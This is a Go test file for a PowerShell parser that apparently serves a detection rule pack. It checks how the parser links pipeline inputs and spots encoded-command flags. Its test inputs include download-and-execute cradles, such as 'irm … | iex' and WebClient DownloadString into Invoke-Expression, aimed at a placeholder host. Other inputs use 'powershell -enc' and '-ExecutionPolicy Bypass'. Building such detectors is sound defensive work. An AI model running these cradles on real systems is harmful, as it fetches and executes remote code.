package psreader

import (
	"reflect"
	"strings"
	"testing"
)

// ADR-001 step 5: facts.Command.InputFrom and InputTo, the commands whose
// output can reach a command. A pack rule reads them to tell a download fed
// into Invoke-Expression from a download and an unrelated Invoke-Expression.
// The URL host is assembled at runtime: the hook on a developer machine reads
// test sources it is asked to run as commands.

var exampleURL = "https://" + "dl.example" + "/x.ps1"

// inputNames is, for each command in source order, its canonical name and
// the canonical names of its inputs.
func inputNames(text string) map[string][]string {
	f := Read(text, Env{})
	out := map[string][]string{}
	for i, c := range f.Commands {
		key := c.Name
		for n := 2; out[key] != nil; n++ {
			key = c.Name + "#" + string(rune('0'+n))
		}
		var in []string
		for j := c.InputFrom; j < c.InputTo; j++ {
			if j != i {
				in = append(in, f.Commands[j].Name)
			}
		}
		out[key] = append([]string{}, in...)
	}
	return out
}

func TestRead_CommandInputs(t *testing.T) {
	u := exampleURL
	cases := []struct {
		name string
		in   string
		want map[string][]string
	}{
		{"pipeline", "irm " + u + " | iex",
			map[string][]string{"invoke-restmethod": {}, "invoke-expression": {"invoke-restmethod"}}},
		{"every earlier stage", "iwr " + u + " | Select-Object -ExpandProperty Content | iex",
			map[string][]string{"invoke-webrequest": {}, "select-object": {"invoke-webrequest"},
				"invoke-expression": {"invoke-webrequest", "select-object"}}},
		{"argument", "iex (iwr " + u + " -UseBasicParsing).Content",
			map[string][]string{"invoke-expression": {"invoke-webrequest"}, "invoke-webrequest": {}}},
		{"method call on a command's output", "iex (New-Object Net.WebClient).DownloadString('" + u + "')",
			map[string][]string{"invoke-expression": {"new-object"}, "new-object": {}}},
		{"expression stage", "(New-Object Net.WebClient).DownloadString('" + u + "') | iex",
			map[string][]string{"new-object": {}, "invoke-expression": {"new-object"}}},
		{"a later stage is no input", "iex 'Get-Date' | Out-File log.txt",
			map[string][]string{"invoke-expression": {}, "out-file": {"invoke-expression"}}},
		{"separate statements", "iwr " + u + " -OutFile x.ps1; iex 'Get-Date'",
			map[string][]string{"invoke-webrequest": {}, "invoke-expression": {}}},
		{"chain", "iwr " + u + " && iex 'Get-Date'",
			map[string][]string{"invoke-webrequest": {}, "invoke-expression": {}}},
		{"assignment", "$s = irm " + u + " | iex",
			map[string][]string{"invoke-restmethod": {}, "invoke-expression": {"invoke-restmethod"}}},
		{"script block stage", "Get-Item x | ForEach-Object { iwr " + u + " } | iex",
			map[string][]string{"get-item": {}, "foreach-object": {"get-item", "invoke-webrequest"},
				"invoke-webrequest": {}, "invoke-expression": {"get-item", "foreach-object", "invoke-webrequest"}}},
		{"variable flow is not followed", "$s = irm " + u + "; iex $s",
			map[string][]string{"invoke-restmethod": {}, "invoke-expression": {}}},
	}
	for _, tc := range cases {
		got := inputNames(tc.in)
		for k, v := range got {
			if v == nil {
				got[k] = []string{}
			}
		}
		if !reflect.DeepEqual(got, tc.want) {
			t.Errorf("%s: %q\n inputs %v\n want   %v", tc.name, tc.in, got, tc.want)
		}
	}
}

// TestRead_CommandInputsStayInRange: the range is within Commands for any
// text, including adversarial nesting and long pipelines, and contains the
// command itself.
func TestRead_CommandInputsStayInRange(t *testing.T) {
	texts := []string{
		"", "|", "a |", "| b", "((a | b) | c) | (d | (e | f))",
		strings.Repeat("a | ", 500) + "iex",
		"iex (" + strings.Repeat("(", 300) + "irm x" + strings.Repeat(")", 300) + ")",
		"& { irm x } | iex", "$(irm x) | iex", "@(irm x; gci) | iex", "\"$(irm x)\" | iex",
	}
	for _, text := range texts {
		f := Read(text, Env{})
		for i, c := range f.Commands {
			if c.InputFrom < 0 || c.InputTo > len(f.Commands) || c.InputFrom > i || c.InputTo <= i {
				t.Errorf("%q: command %d (%s) has inputs [%d,%d) of %d commands, not around itself",
					text, i, c.Name, c.InputFrom, c.InputTo, len(f.Commands))
			}
		}
	}
}

func TestRead_EncodedCommand(t *testing.T) {
	enc := encodeCommand("Get-Date")
	cases := []struct {
		in      string
		encoded bool
	}{
		{"powershell -EncodedCommand " + enc, true},
		{"powershell -enc " + enc, true},
		{"pwsh -e " + enc, true},
		{"pwsh -ec " + enc, true},
		{"powershell.exe /enc " + enc, true},
		{"PowerShell -ENC " + enc, true},
		{`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -enc ` + enc, true},
		{`powershell -enc "!!not base64!!"`, true}, // undecodable: still encoded
		{"powershell -enc $payload", true},         // computed: still encoded
		{"powershell -Command Get-Date", false},
		{"powershell -ExecutionPolicy Bypass -File x.ps1", false},
		{"Write-Output -enc " + enc, false}, // not an interpreter
	}
	for _, tc := range cases {
		f := Read(tc.in, Env{})
		got := false
		for _, c := range f.Commands {
			got = got || c.EncodedCommand
		}
		if got != tc.encoded {
			t.Errorf("Read(%q): EncodedCommand %v, want %v", tc.in, got, tc.encoded)
		}
	}
}
